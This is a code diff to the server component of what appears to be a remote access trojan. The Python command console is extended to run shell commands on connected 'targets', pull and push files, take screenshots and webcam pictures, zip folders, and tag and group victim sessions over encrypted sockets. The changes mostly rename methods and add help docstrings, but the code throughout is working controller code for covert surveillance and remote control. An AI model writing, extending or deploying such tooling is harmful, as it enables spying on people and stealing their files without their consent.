@@ -30,11 +30,11 @@ class Server:
                 elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["timeout", "zip_compression", "camera_port", "percentage_dec_places"]:
                     self.set_option(attribute[0].split()[0].lower(), attribute[0].split()[1])
                 elif command == "l" and len(attribute):
-                    self.generate_texttable(self.get_conn_fgoi(attribute[0].split()))
+                    self.list_sessions(self.get_conn_fgoi(attribute[0].split()))
                 elif command == "t" and len(attribute) == 2:
-                    self.change_tag(attribute[0], self.get_conn_fgoi(attribute[1].split()))
+                    self.edit_tag(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                 elif command == "r" and len(attribute):
-                    self.remove_connection(self.get_conn_fgoi(attribute[0].split()))
+                    self.close_session(self.get_conn_fgoi(attribute[0].split()))
                 elif command == "g" and len(attribute) == 2 and attribute[0].split()[0].lower() in ["add", "rm"]:
                     self.edit_group(attribute[0].split()[0].lower(), self.get_conn_fgoi(attribute[0].split()[0:]), attribute[1].split())
                 elif command == "f" and len(attribute) == 2 and attribute[0].split()[0] in ["set", "get"]:
@@ -61,7 +61,7 @@ class Server:
                 elif command == "w" and len(attribute) == 2:
                     self.capture_camera_picture(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                 elif command == "x":
-                    self.connection.sock.close()
+                    self.exit_server()
                     break
                 else:
                     print("[-] InvalidInputError")
@@ -69,22 +69,34 @@ class Server:
                 print("[-] InvalidInputError")
 
     def print_help(self):
-        print("h show this page")
-        print("o [timeout/zip_compression/camera_port] [value] set option")
-        print("l [clients] list clients")
-        print("t [tag] @ [clients] change tag")
-        print("r [clients] close and remove connection")
-        print("g [add/rm] [clients] @ [group name] change group")
-        print("f [set/get] [path] @ [clients] set or get current working directory")
-        print("c [command] @ [clients]  execute console command")
-        print("d [path to open] @ [path to save] @ [clients] download file from target")
-        print("u [path to open] @ [path to save] @ [clients] upload file to target")
-        print("s [monitor] [path_to_save] @ [clients] capture screenshot")
-        print("z [path_to_open] @ [path_to_save] @ [clients] zip file or folder")
-        print("w [path_to_save] @ [clients] capture camera picture")
-        print("x exit server")
+        """h
+        description: print help
+        usage: h"""
+        print(self.print_help.__doc__)
+        print(self.set_option.__doc__)
+        print(self.list_sessions.__doc__)
+        print(self.edit_tag.__doc__)
+        print(self.close_session.__doc__)
+        print(self.edit_group.__doc__)
+        print(self.cwd.__doc__)
+        print(self.execute_command.__doc__)
+        print(self.download_file.__doc__)
+        print(self.upload_file.__doc__)
+        print(self.make_screenshot.__doc__)
+        print(self.zip_file_or_folder.__doc__)
+        print(self.capture_camera_picture.__doc__)
+        print(self.exit_server.__doc__)
 
-    def generate_texttable(self, connections):
+    def exit_server(self):
+        """x
+        description: exit server (not closing sessions)
+        usage: x"""
+        self.connection.sock.close()
+
+    def list_sessions(self, connections):
+        """l
+        description: list sessions
+        usage: l [index(es)/group(s)]"""
         table = texttable.Texttable()
         table.set_cols_width([5, 15, 6, 15, 15])
         rows = [["INDEX", "ADDRESS", "PORT", "TAG", "GROUPS"]]
@@ -95,6 +107,9 @@ class Server:
         print(table.draw())
 
     def set_option(self, option, value):
+        """o
+        description: edit option
+        usage: o [timeout/zip_compression/camera_port] [value]"""
         option = option.lower()
         if option == "timeout":
             try:
@@ -118,12 +133,18 @@ class Server:
             except ValueError:
                 print("[-] InvalidCameraPort")
 
-    def change_tag(self, tag, connections):
+    def edit_tag(self, tag, connections):
+        """t
+        description: edit tag
+        usage: t [value] @ [index(es)/group(s)]"""
         for index, session in enumerate(self.connection.sessions):
             if session["connection"] in connections:
                 self.connection.sessions[index]["tag"] = tag
 
-    def remove_connection(self, connections):
+    def close_session(self, connections):
+        """r
+        description: close a session
+        usage: r [index(es)/group(s)]"""
         request = {"cmd": "r",
                    "timeout": self.timeout}
         for session in list(self.connection.sessions):
@@ -136,6 +157,9 @@ class Server:
                 self.connection.sessions.remove(session)
 
     def edit_group(self, mode, connections, group_names):
+        """g
+        description: edit group
+        usage: g [add/rm] [index(es)/group(s)] @ [group name]"""
         if mode == "add":
             for index, session in enumerate(self.connection.sessions):
                 if session["connection"] in connections:
@@ -155,6 +179,9 @@ class Server:
                             print("[-] TargetNotInGroup")
 
     def cwd(self, mode, path, connections):
+        """f
+        description: set or get current working directory
+        usage: f [set/get] [path] @ [index(es)/group(s)]"""
         request = {"cmd": "f",
                    "mode": mode,
                    "path": path,
@@ -169,6 +196,9 @@ class Server:
                 print(f"[-] {response['error']}")
 
     def execute_command(self, exe, connections):
+        """:c
+        description: execute console command
+        usage: c [command] @ [index(es)/group(s)]"""
         request = {"cmd": "c",
                    "exe": exe,
                    "timeout": self.timeout}
@@ -182,6 +212,9 @@ class Server:
                 print(f"[-] {response['error']}")
 
     def download_file(self, path_to_open, path_to_save, connections):
+        """d
+        description: download file from target
+        usage: d [path to open] @ [path to save] @ [index(es)/group(s)]"""
         request = {"cmd": "d",
                    "open_path": path_to_open}
         for connection in connections:
@@ -197,6 +230,9 @@ class Server:
                     print("[-] PermissionError")
 
     def upload_file(self, path_to_open, path_to_save, connections):
+        """d
+        description: upload file from target
+        usage: u [path to open] @ [path to save] @ [index(es)/group(s)]"""
         request = {"cmd": "u",
                    "save_path": path_to_save,
                    "data": str()}
@@ -215,6 +251,9 @@ class Server:
                     print(f"[-] {response['error']}")
 
     def make_screenshot(self, monitor, path_to_save, connections):
+        """s
+        description: capture a screen picture
+        usage: s [monitor] [path_to_save] @ [clients]"""
         request = {"cmd": "s",
                    "monitor": monitor,
                    "save_path": path_to_save,
@@ -227,6 +266,9 @@ class Server:
                 print(f"[-] {response['error']}")
 
     def zip_file_or_folder(self, path_to_open, path_to_save, connections):
+        """z
+        description: compress file or folder to zip archive
+        usage: z [path_to_open] @ [path_to_save] @ [clients]"""
         request = {"cmd": "z",
                    "comp_lvl": self.zip_compression_level,
                    "open_path": path_to_open,
@@ -240,6 +282,9 @@ class Server:
                 print(f"[-] {response['error']}")
 
     def capture_camera_picture(self, path_to_save, connections):
+        """w
+        description: capture camera picture
+        usage: w [path_to_save] @ [clients]"""
         request = {"cmd": "w",
                    "cam_port": self.camera_port,
                    "save_path": path_to_save,
@@ -311,12 +356,15 @@ class Connection:
     def send(self, data: dict, connection):
         data = bytearray(base64.b64encode(self.encrypt(json.dumps(data).encode(self.CODEC))) + self.END_MARKER)
         len_data_total = len(data)
-        while data:
-            connection.send(data[:self.PACKET_SIZE])
-            del data[:self.PACKET_SIZE]
-            len_data_current = len_data_total - len(data)
-            sys.stdout.write(f"\r[*] sending... {round(len_data_current / (len_data_total / 100), 1)}% [{self.format_byte_length(len_data_current)} / {self.format_byte_length(len_data_total)}] complete")
-            sys.stdout.flush()
+        try:
+            while data:
+                connection.send(data[:self.PACKET_SIZE])
+                del data[:self.PACKET_SIZE]
+                len_data_current = len_data_total - len(data)
+                sys.stdout.write(f"\r[*] sending... {round(len_data_current / (len_data_total / 100), 1)}% [{self.format_byte_length(len_data_current)} / {self.format_byte_length(len_data_total)}] complete")
+                sys.stdout.flush()
+        except socket.error as error:
+            print(f"\r[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
         print()
 
     def recv(self, connection) -> dict:
